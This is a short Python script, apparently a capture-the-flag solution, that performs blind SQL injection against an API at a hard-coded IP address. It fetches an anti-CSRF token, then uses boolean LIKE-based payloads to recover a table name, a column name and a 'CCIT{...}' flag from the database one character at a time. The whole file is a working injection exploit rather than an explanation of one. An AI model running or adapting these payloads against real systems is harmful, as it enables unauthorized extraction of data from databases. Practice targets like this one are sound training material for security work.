import requests
import string


class Inj:
    def __init__(self, host):
        self.sess = requests.Session()  # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()  # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']


def match(lists, query, word):
    while 1:
        for _ in lists:
            if _ != 'm':
                result, error = inj.blind(query.format(word + _))
                if result == 'Success':
                    word += _
                    break
        else:
            break

    return word


inj = Inj('http://149.202.200.158:5100')

chars_flag = string.ascii_letters + string.digits + '{}_!?'
chars_tc = string.ascii_lowercase

query_table = "1' AND (SELECT 1 FROM information_schema.tables WHERE table_name LIKE '{}%') = 1 -- '"
query_column = "1' AND (SELECT 1 FROM information_schema.columns WHERE table_name = 'secret' " \
               "AND column_name LIKE '{}%') = 1 -- '"
query_flag = "1' AND (SELECT 1 FROM secret WHERE asecret LIKE '{}%') = 1 -- '"


print('Table:', match(chars_tc, query_table, word=''))
print('Column:', match(chars_tc, query_column, word=''))
print('Flag:', match(chars_flag, query_flag, word='').replace('ccit{a', 'CCIT{A'))

